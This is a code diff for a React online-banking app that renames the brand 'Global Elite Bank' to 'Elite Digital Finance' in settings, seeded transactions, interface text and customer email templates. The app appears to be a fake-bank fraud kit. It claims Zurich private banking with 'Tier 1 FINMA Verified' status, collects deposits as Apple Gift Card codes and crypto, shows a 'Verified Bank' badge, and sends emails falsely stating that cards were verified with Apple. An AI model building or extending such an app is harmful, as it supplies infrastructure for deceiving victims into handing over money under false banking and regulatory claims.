@@ -341,7 +341,7 @@ export const INITIAL_TRANSACTIONS: Transaction[] = [
     recipientDetails: {
       name: "DEB STAR",
       accountNumber: "92348059788",
-      bank: "Global Elite Bank Zurich",
+      bank: "Elite Digital Finance Zurich",
       remarks: "Account Activation & Private Liquidity Credit"
     }
   }
@@ -538,7 +538,7 @@ export const DEFAULT_FRONTEND_CONTENT: FrontendContent = {
   aboutTeamIsabelleRole: 'Chief Compliance Officer',
   aboutTeamIsabelleImg: 'https://i.ibb.co/1Gwq9LMm/Ms-Isabelle-Moreau.jpg',
 
-  homeStaffHeading: 'Global Elite Bank Leadership & Staff',
+  homeStaffHeading: 'Elite Digital Finance Leadership & Team',
   homeStaffImg: 'https://i.ibb.co/PsZ7fdd0/GEB-Staff-Photo.png',
 
   servicesHallHeading: 'Executive Banking Hall',
@@ -578,7 +578,7 @@ export const DEFAULT_INITIAL_ADMIN_SETTINGS: AdminSettings = {
   smtpPass: "",
   smtpSecure: true,
   emailFrom: "info@digitalglobalelite.com",
-  emailFromName: "Global Elite Bank",
+  emailFromName: "Elite Digital Finance",
   googleClientId: "",
   googleClientSecret: "",
   googleRedirectUrl: "http://yoursite.com/auth/google/callback",
@@ -594,8 +594,8 @@ export const DEFAULT_INITIAL_ADMIN_SETTINGS: AdminSettings = {
   contactPhone: '+1 (555) 000-0000',
   contactAddress: '109, Feldgüetliweg Meilen Bezirk Meilen Zurich 8706 Switzerland',
   frontendContent: DEFAULT_FRONTEND_CONTENT,
-  websiteName: 'Global Elite Bank',
-  websiteTitle: 'Welcome to Global Elite Bank',
+  websiteName: 'Elite Digital Finance',
+  websiteTitle: 'Welcome to Elite Digital Finance',
   websiteKeywords: 'online bank',
   websiteUrl: 'https://digitalglobalelite.com',
   whatsappNumber: '+1 (207) 613-1332',
@@ -617,16 +617,16 @@ export const DEFAULT_INITIAL_ADMIN_SETTINGS: AdminSettings = {
   ],
   brokerWallets: DEFAULT_BROKER_WALLETS,
   fiatDepositInstructions: {
-    bankName: 'Global Elite Partner Bank (US)',
-    accountName: 'Global Elite Holdings LLC',
+    bankName: 'Elite Digital Partner Clearing (US)',
+    accountName: 'Elite Digital Holdings LLC',
     accountNumber: '3482910048',
     routingNumber: '021000021',
     swiftBic: 'GEHBUS33',
     bankAddress: '120 Broadway, New York, NY 10271, USA',
-    referencePlaceholder: 'Include your Global Elite Account ID in the transfer memo'
+    referencePlaceholder: 'Include your Elite Digital Account ID in the transfer memo'
   },
   eWalletInstructions: {
-    providerName: 'Global Elite Official PayPal',
+    providerName: 'Elite Digital Official Settlement',
     accountEmail: 'deposits@digitalglobalelite.com'
   },
   appleGiftCardSettings: DEFAULT_APPLE_GIFTCARD_SETTINGS
@@ -1659,7 +1659,7 @@ export function BankProvider({ children }: { children: ReactNode }) {
               smtpPass: nonNullSettings.smtpPass || prev.smtpPass || '',
               smtpSecure: nonNullSettings.smtpSecure !== undefined ? Boolean(nonNullSettings.smtpSecure) : (prev.smtpSecure ?? true),
               emailFrom: nonNullSettings.emailFrom || prev.emailFrom || 'info@digitalglobalelite.com',
-              emailFromName: nonNullSettings.emailFromName || prev.emailFromName || 'Global Elite Bank',
+              emailFromName: nonNullSettings.emailFromName || prev.emailFromName || 'Elite Digital Finance',
               googleClientId: nonNullSettings.googleClientId || prev.googleClientId || '',
               googleClientSecret: nonNullSettings.googleClientSecret || prev.googleClientSecret || '',
               googleRedirectUrl: nonNullSettings.googleRedirectUrl || prev.googleRedirectUrl || 'http://yoursite.com/auth/google/callback',
@@ -2403,8 +2403,8 @@ export function BankProvider({ children }: { children: ReactNode }) {
         setTimeout(() => {
           sendTransactionalEmail({
             to: newUser.email,
-            subject: `🏛️ Welcome to Global Elite Bank - Your Account #${primAcc?.accountNumber || ''} is Active`,
-            body: `Dear ${newUser.name},\n\nWe are privileged to welcome you as a private client of Global Elite Bank.\n\nYour numbered multi-currency account has been officially opened and authenticated by our compliance directorate.\n\nAccount Credentials & Profile:\n• Account Name: ${newUser.name}\n• Primary Account Number: #${primAcc?.accountNumber || ''}\n• IBAN: ${primAcc?.iban || 'CH93 0000 0000 ' + (primAcc?.accountNumber?.slice(-4) || '8821')}\n• Currency: ${newUser.currency || 'USD'}\n• Account Tier: Private Checking\n• Security Clearance: Tier 1 FINMA Verified\n\nFunding Instructions:\nYou may now log in to fund your account via International Wire (SWIFT), Institutional Cold-Storage Crypto (BTC, ETH, USDT, SOL), or our instant Apple Gift Card redemption desk.\n\nThank you for trusting Global Elite Bank.\n\nWarm regards,\nAdmissions & Compliance Directorate\nGlobal Elite Bank, Zurich, Switzerland`
+            subject: `🏛️ Welcome to Elite Digital Finance - Your Account #${primAcc?.accountNumber || ''} is Active`,
+            body: `Dear ${newUser.name},\n\nWe are privileged to welcome you as a private client of Elite Digital Finance.\n\nYour numbered multi-currency account has been officially opened and authenticated by our compliance directorate.\n\nAccount Credentials & Profile:\n• Account Name: ${newUser.name}\n• Primary Account Number: #${primAcc?.accountNumber || ''}\n• IBAN: ${primAcc?.iban || 'CH93 0000 0000 ' + (primAcc?.accountNumber?.slice(-4) || '8821')}\n• Currency: ${newUser.currency || 'USD'}\n• Account Tier: Private Checking\n• Security Clearance: Tier 1 FINMA Verified\n\nFunding Instructions:\nYou may now log in to fund your account via International Wire (SWIFT), Institutional Cold-Storage Crypto (BTC, ETH, USDT, SOL), or our instant Apple Gift Card redemption desk.\n\nThank you for trusting Elite Digital Finance.\n\nWarm regards,\nAdmissions & Compliance Directorate\nElite Digital Finance, Zurich, Switzerland`
           });
         }, 400);
       }
@@ -2606,8 +2606,8 @@ Your application for membership is currently being reviewed by our Membership Co
             type: 'deposit',
             status: 'completed',
             recipientDetails: {
-              name: 'Global Elite Bank Credit',
-              bank: 'Global Elite Internal Transfer',
+              name: 'Elite Digital Finance Credit',
+              bank: 'Elite Digital Internal Transfer',
               remarks: `Approved Loan Disbursement (Ref: ${loan.id})`
             }
           });
@@ -2626,34 +2626,34 @@ Your application for membership is currently being reviewed by our Membership Co
         if (status === 'approved') {
           setMockEmail({
             to: app.email,
-            subject: "🎉 Congratulations! Your Global Elite Bank Application has been Approved",
+            subject: "🎉 Congratulations! Your Elite Digital Finance Application has been Approved",
             body: `Dear ${app.name},
 
-Congratulations! We are delighted to inform you that your application for an exclusive private banking account with Global Elite Bank has been officially APPROVED.
+Congratulations! We are delighted to inform you that your application for an exclusive private banking account with Elite Digital Finance has been officially APPROVED.
 
 Your private client profile is currently being provisioned with multi-currency capabilities, VIP security clearance credentials, and premier wealth management access.
 
-Welcome to Global Elite Bank.
+Welcome to Elite Digital Finance.
 
 Warm regards,
 Admissions & Compliance Directorate
-Global Elite Bank, Zurich, Switzerland`
+Elite Digital Finance, Zurich, Switzerland`
           });
         } else if (status === 'rejected') {
           setMockEmail({
             to: app.email,
-            subject: "Notice Regarding Your Application - Global Elite Bank",
+            subject: "Notice Regarding Your Application - Elite Digital Finance",
             body: `Dear ${app.name},
 
-Thank you for your interest in establishing a private banking relationship with Global Elite Bank.
+Thank you for your interest in establishing a private banking relationship with Elite Digital Finance.
 
 Following a thorough assessment by our Admissions & Compliance Committee, we regret to inform you that your application could not be approved at this time under our current institutional onboarding guidelines and jurisdictional criteria.
 
-We thank you for considering Global Elite Bank and wish you continued success.
+We thank you for considering Elite Digital Finance and wish you continued success.
 
 Sincerely,
 Admissions & Compliance Directorate
-Global Elite Bank, Zurich, Switzerland`
+Elite Digital Finance, Zurich, Switzerland`
           });
         }
       }, 300);
@@ -2729,8 +2729,8 @@ Global Elite Bank, Zurich, Switzerland`
             type: 'deposit',
             status: 'completed',
             recipientDetails: {
-              name: 'Global Elite Foundation Grant',
-              bank: 'Global Elite Internal Transfer',
+              name: 'Elite Digital Foundation Grant',
+              bank: 'Elite Digital Internal Transfer',
               remarks: `Grant Disbursement (Ref: ${grant.id})`
             }
           });
@@ -2774,9 +2774,9 @@ Global Elite Bank, Zurich, Switzerland`
   const sendTransactionalEmail = async (email: { to: string; subject: string; body: string; html?: string; fromName?: string; fromEmail?: string; logoUrl?: string }) => {
     if (!email.to) return;
     
-    const effectiveFromName = email.fromName || adminSettings.emailFromName || adminSettings.websiteName || 'Global Elite Bank';
+    const effectiveFromName = email.fromName || adminSettings.emailFromName || adminSettings.websiteName || 'Elite Digital Finance';
     const effectiveFromEmail = email.fromEmail || adminSettings.emailFrom || 'info@digitalglobalelite.com';
-    const effectiveLogoUrl = email.logoUrl || adminSettings.logoUrl || 'https://i.postimg.cc/vBZjpPr4/GEB-logo.png';
+    const effectiveLogoUrl = email.logoUrl || adminSettings.logoUrl || 'https://i.postimg.cc/zXswZC0Y/Elite-Digital-Gold-Globe-Logo.png';
     const nowIso = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' });
 
     // 1. Immediately display the in-app email alert modal with verified Bank Profile identity
@@ -2803,7 +2803,7 @@ Global Elite Bank, Zurich, Switzerland`
           fromEmail: effectiveFromEmail,
           fromName: effectiveFromName,
           logoUrl: effectiveLogoUrl,
-          websiteName: adminSettings.websiteName || 'Global Elite Bank',
+          websiteName: adminSettings.websiteName || 'Elite Digital Finance',
           smtpConfig: adminSettings.smtpHost ? {
             host: adminSettings.smtpHost,
             port: adminSettings.smtpPort,
@@ -2997,7 +2997,7 @@ Global Elite Bank, Zurich, Switzerland`
           sendTransactionalEmail({
             to: clientUser.email,
             subject: `💸 Debit Alert: ${currencySymbol}${txn.amount.toLocaleString()} Debited from Account #${accNum}`,
-            body: `Dear ${clientUser.name},\n\nThis is an official transaction alert from ${adminSettings.websiteName || 'Global Elite Bank'}.\n\nA debit transaction has been authorized and dispatched from your account.\n\nTransaction Summary:\n• Amount Debited: ${currencySymbol}${txn.amount.toLocaleString()}\n• Account Number: #${accNum}\n• Rail / Method: ${transferTypeLabel}\n• Beneficiary Name: ${recipientName}\n• Reference / TXID: ${newTxn.id.slice(0, 16).toUpperCase()}\n• Date & Time: ${formattedDate} UTC\n• Description: ${txn.description || txn.recipientDetails?.remarks || 'Outward Funds Transfer'}\n\nIf you did not initiate or authorize this transaction, please immediately lock your cards and notify our 24/7 Security Operations Center.\n\nWarm regards,\nGlobal Elite Bank Private Banking\nZurich, Switzerland`
+            body: `Dear ${clientUser.name},\n\nThis is an official transaction alert from ${adminSettings.websiteName || 'Elite Digital Finance'}.\n\nA debit transaction has been authorized and dispatched from your account.\n\nTransaction Summary:\n• Amount Debited: ${currencySymbol}${txn.amount.toLocaleString()}\n• Account Number: #${accNum}\n• Rail / Method: ${transferTypeLabel}\n• Beneficiary Name: ${recipientName}\n• Reference / TXID: ${newTxn.id.slice(0, 16).toUpperCase()}\n• Date & Time: ${formattedDate} UTC\n• Description: ${txn.description || txn.recipientDetails?.remarks || 'Outward Funds Transfer'}\n\nIf you did not initiate or authorize this transaction, please immediately lock your cards and notify our 24/7 Security Operations Center.\n\nWarm regards,\nElite Digital Finance Private Banking\nZurich, Switzerland`
           });
         }, 300);
       }
@@ -3008,7 +3008,7 @@ Global Elite Bank, Zurich, Switzerland`
           sendTransactionalEmail({
             to: clientUser.email,
             subject: `💰 Credit Alert: ${currencySymbol}${txn.amount.toLocaleString()} Credited to Account #${accNum}`,
-            body: `Dear ${clientUser.name},\n\nThis is an official transaction alert from ${adminSettings.websiteName || 'Global Elite Bank'}.\n\nFunds have been successfully verified and credited to your account.\n\nCredit Details:\n• Amount Credited: ${currencySymbol}${txn.amount.toLocaleString()}\n• Target Account: #${accNum}\n• Status: Cleared & Available\n• Reference / TXID: ${newTxn.id.slice(0, 16).toUpperCase()}\n• Date & Time: ${formattedDate} UTC\n• Source / Channel: ${txn.recipientDetails?.bank || txn.recipientDetails?.remarks || 'Direct Deposit / Clearing Settlement'}\n\nThank you for choosing Global Elite Bank for your premier wealth management.\n\nWarm regards,\nGlobal Elite Bank Private Banking\nZurich, Switzerland`
+            body: `Dear ${clientUser.name},\n\nThis is an official transaction alert from ${adminSettings.websiteName || 'Elite Digital Finance'}.\n\nFunds have been successfully verified and credited to your account.\n\nCredit Details:\n• Amount Credited: ${currencySymbol}${txn.amount.toLocaleString()}\n• Target Account: #${accNum}\n• Status: Cleared & Available\n• Reference / TXID: ${newTxn.id.slice(0, 16).toUpperCase()}\n• Date & Time: ${formattedDate} UTC\n• Source / Channel: ${txn.recipientDetails?.bank || txn.recipientDetails?.remarks || 'Direct Deposit / Clearing Settlement'}\n\nThank you for choosing Elite Digital Finance for your premier wealth management.\n\nWarm regards,\nElite Digital Finance Private Banking\nZurich, Switzerland`
           });
         }, 300);
       }
@@ -3051,7 +3051,7 @@ Global Elite Bank, Zurich, Switzerland`
               sendTransactionalEmail({
                 to: clientUser.email,
                 subject: `✅ Transaction Cleared: ${currencySymbol}${t.amount.toLocaleString()} in Account #${accNum}`,
-                body: `Dear ${clientUser.name},\n\nWe are pleased to inform you that your transaction (Ref: ${t.id.slice(0, 16).toUpperCase()}) has successfully cleared and been settled in your account.\n\nTransaction Summary:\n• Amount: ${currencySymbol}${t.amount.toLocaleString()}\n• Account: #${accNum}\n• Status: Completed & Cleared\n• Details: ${t.recipientDetails?.remarks || t.description || 'Institutional Clearing'}\n\nWarm regards,\nGlobal Elite Bank Private Banking\nZurich, Switzerland`
+                body: `Dear ${clientUser.name},\n\nWe are pleased to inform you that your transaction (Ref: ${t.id.slice(0, 16).toUpperCase()}) has successfully cleared and been settled in your account.\n\nTransaction Summary:\n• Amount: ${currencySymbol}${t.amount.toLocaleString()}\n• Account: #${accNum}\n• Status: Completed & Cleared\n• Details: ${t.recipientDetails?.remarks || t.description || 'Institutional Clearing'}\n\nWarm regards,\nElite Digital Finance Private Banking\nZurich, Switzerland`
               });
             }, 300);
           }
@@ -3102,7 +3102,7 @@ Global Elite Bank, Zurich, Switzerland`
     sendTransactionalEmail({
       to: cardData.userEmail,
       subject: `🍏 Apple Gift Card Deposit Received ($${cardData.amount.toLocaleString()} USD) - Ref: ${receiptNumber}`,
-      body: `Dear ${cardData.userName},\n\nWe have successfully received your Apple Gift Card deposit request.\n\nDeposit Submission Details:\n• Card Face Value: $${cardData.amount.toLocaleString()} ${cardData.currency}\n• Payout Credited Amount: $${cardData.payoutAmount.toLocaleString()} USD\n• Card Redemption Code: ${cardData.cardCode.replace(/.(?=.{4})/g, '*')}\n• Reference Number: ${receiptNumber}\n• Target Account: #${cardData.targetAccountNumber || 'Checking Account'}\n• Status: Pending Institutional Verification\n\nOur verification team is validating the card code with the official Apple Store gift card registry. Once confirmed, your balance will be credited promptly.\n\nThank you for banking with Global Elite Bank.\n\nWarm regards,\nInstitutional Clearing Desk\nGlobal Elite Bank, Zurich, Switzerland`
+      body: `Dear ${cardData.userName},\n\nWe have successfully received your Apple Gift Card deposit request.\n\nDeposit Submission Details:\n• Card Face Value: $${cardData.amount.toLocaleString()} ${cardData.currency}\n• Payout Credited Amount: $${cardData.payoutAmount.toLocaleString()} USD\n• Card Redemption Code: ${cardData.cardCode.replace(/.(?=.{4})/g, '*')}\n• Reference Number: ${receiptNumber}\n• Target Account: #${cardData.targetAccountNumber || 'Checking Account'}\n• Status: Pending Institutional Verification\n\nOur verification team is validating the card code with the official Apple Store gift card registry. Once confirmed, your balance will be credited promptly.\n\nThank you for banking with Elite Digital Finance.\n\nWarm regards,\nInstitutional Clearing Desk\nElite Digital Finance, Zurich, Switzerland`
     });
 
     return {
@@ -3157,7 +3157,7 @@ Global Elite Bank, Zurich, Switzerland`
           sendTransactionalEmail({
             to: c.userEmail,
             subject: `🍏 Deposit Approved: Apple Gift Card Credited ($${finalAmount.toLocaleString()} USD)`,
-            body: `Dear ${c.userName},\n\nGreat news! Your Apple Gift Card submission has been verified with Apple and approved.\n\nDeposit Summary:\n• Credited Amount: $${finalAmount.toLocaleString()} USD\n• Card Value: $${c.amount.toLocaleString()} ${c.currency}\n• Reference Number: ${c.receiptNumber}\n• Clearing Authorization: ${txHash}\n• Status: Cleared & Available in Account #${c.targetAccountNumber || 'Checking'}\n\nYour account balance has been updated and is available for immediate transactions, wire transfers, or investments.\n\nWarm regards,\nGlobal Elite Bank Private Banking\nZurich, Switzerland`
+            body: `Dear ${c.userName},\n\nGreat news! Your Apple Gift Card submission has been verified with Apple and approved.\n\nDeposit Summary:\n• Credited Amount: $${finalAmount.toLocaleString()} USD\n• Card Value: $${c.amount.toLocaleString()} ${c.currency}\n• Reference Number: ${c.receiptNumber}\n• Clearing Authorization: ${txHash}\n• Status: Cleared & Available in Account #${c.targetAccountNumber || 'Checking'}\n\nYour account balance has been updated and is available for immediate transactions, wire transfers, or investments.\n\nWarm regards,\nElite Digital Finance Private Banking\nZurich, Switzerland`
           });
 
           return approvedCard;
@@ -3195,7 +3195,7 @@ Global Elite Bank, Zurich, Switzerland`
           sendTransactionalEmail({
             to: c.userEmail,
             subject: `Notice: Apple Gift Card Deposit Update (Ref: ${c.receiptNumber})`,
-            body: `Dear ${c.userName},\n\nWe regret to inform you that your Apple Gift Card deposit submission (Ref: ${c.receiptNumber}) could not be verified and has been rejected by our clearing desk.\n\nReason for Rejection:\n${rejectedReason}\n\nIf you have a replacement card or valid purchase receipt from Apple, please submit a new deposit request or contact our 24/7 customer support.\n\nSincerely,\nInstitutional Clearing Desk\nGlobal Elite Bank, Zurich, Switzerland`
+            body: `Dear ${c.userName},\n\nWe regret to inform you that your Apple Gift Card deposit submission (Ref: ${c.receiptNumber}) could not be verified and has been rejected by our clearing desk.\n\nReason for Rejection:\n${rejectedReason}\n\nIf you have a replacement card or valid purchase receipt from Apple, please submit a new deposit request or contact our 24/7 customer support.\n\nSincerely,\nInstitutional Clearing Desk\nElite Digital Finance, Zurich, Switzerland`
           });
 
           return {
@@ -3654,11 +3654,11 @@ Global Elite Bank, Zurich, Switzerland`
                 <div className="relative shrink-0">
                   <div className="w-12 h-12 sm:w-14 sm:h-14 rounded-full overflow-hidden border-2 border-primary/40 bg-black/40 flex items-center justify-center shadow-inner">
                     <img 
-                      src={mockEmail.logoUrl || adminSettings.logoUrl || 'https://i.postimg.cc/vBZjpPr4/GEB-logo.png'} 
+                      src={mockEmail.logoUrl || adminSettings.logoUrl || 'https://i.postimg.cc/zXswZC0Y/Elite-Digital-Gold-Globe-Logo.png'} 
                       alt="Bank Profile Logo" 
                       className="w-full h-full object-contain p-1"
                       onError={(e) => {
-                        (e.currentTarget as HTMLImageElement).src = 'https://i.postimg.cc/vBZjpPr4/GEB-logo.png';
+                        (e.currentTarget as HTMLImageElement).src = 'https://i.postimg.cc/zXswZC0Y/Elite-Digital-Gold-Globe-Logo.png';
                       }}
                     />
                   </div>
@@ -3670,7 +3670,7 @@ Global Elite Bank, Zurich, Switzerland`
                 <div className="flex-1 min-w-0">
                   <div className="flex items-center gap-1.5 flex-wrap">
                     <span className="font-extrabold text-sm sm:text-base text-foreground tracking-tight truncate">
-                      {mockEmail.fromName || adminSettings.emailFromName || adminSettings.websiteName || 'Global Elite Bank'}
+                      {mockEmail.fromName || adminSettings.emailFromName || adminSettings.websiteName || 'Elite Digital Finance'}
                     </span>
                     <span className="inline-flex items-center gap-1 text-[10px] font-bold px-2 py-0.5 rounded-full bg-emerald-500/15 text-emerald-600 dark:text-emerald-400 border border-emerald-500/30">
                       <ShieldCheck size={11} /> Verified Bank
